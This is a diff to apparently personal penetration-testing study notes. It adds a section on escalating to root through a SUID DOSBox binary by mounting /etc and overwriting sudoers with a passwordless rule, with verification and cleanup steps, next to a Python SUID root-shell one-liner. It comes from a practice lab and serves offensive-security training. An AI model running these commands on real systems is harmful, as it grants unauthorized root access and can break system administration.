@@ -191,6 +191,30 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 > See https://gtfobins.github.io/ -- filter by SUID -- for the full list per binary.
 
+### DOSBox SUID → Sudoers Write (non-GTFOBins pattern)
+
+DOSBox is a DOS emulator. When it is SUID root, its mounted-drive file writes run with root effective privileges.
+
+```bash
+# Check if dosbox is SUID
+find / -perm -u=s -type f 2>/dev/null | grep dosbox
+
+# Mount /etc as DOS drive C:, then overwrite sudoers
+dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'
+# ALSA/audio errors are normal when no sound device is available.
+
+# Verify
+sudo -n id
+# uid=0(root)
+sudo -n bash
+
+# Cleanup — restore from the pacman package cache (Arch Linux)
+bsdtar -xOf /var/cache/pacman/pkg/sudo-<version>-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers
+grep NOPASSWD /etc/sudoers   # should return nothing
+```
+
+> `echo >` overwrites sudoers entirely; restore it from the original package or a verified backup. Source: Nukem (PG Practice), [[PrivEsc Linux - SUID]]
+
 ---
 
 ## Linux Capabilities Exploitation (Module 18.4.1)
